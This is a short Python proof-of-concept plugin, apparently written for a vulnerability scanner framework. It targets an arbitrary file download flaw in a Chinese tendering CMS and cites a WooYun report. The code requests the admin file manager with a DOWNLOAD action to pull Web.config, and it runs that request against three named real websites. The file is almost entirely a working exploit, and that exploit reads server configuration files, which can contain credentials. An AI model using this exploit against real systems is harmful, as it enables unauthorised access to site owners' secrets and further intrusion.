#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:某招投标类CMS通用型任意文件下载
#Refer:http://www.wooyun.org/bugs/wooyun-2010-059596

def assign(service,arg):
    if service=="hsort":
        return True,arg 
    
def  audit(arg):
    url=arg+"Admin/fileManage.aspx?action=DOWNLOAD&value1=~%2FWeb.config"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'configuration' in res:
        security_hole('file download Vulnerable:'+url)
        
if __name__=="__main__":
    from dummy import *
    
    audit(assign('hsort','http://dzb.clynews.com/')[1])
    audit(assign('hsort','http://www.aheca.cn:8080/')[1])    
    audit(assign('hsort','http://www.hljjjb.com/')[1])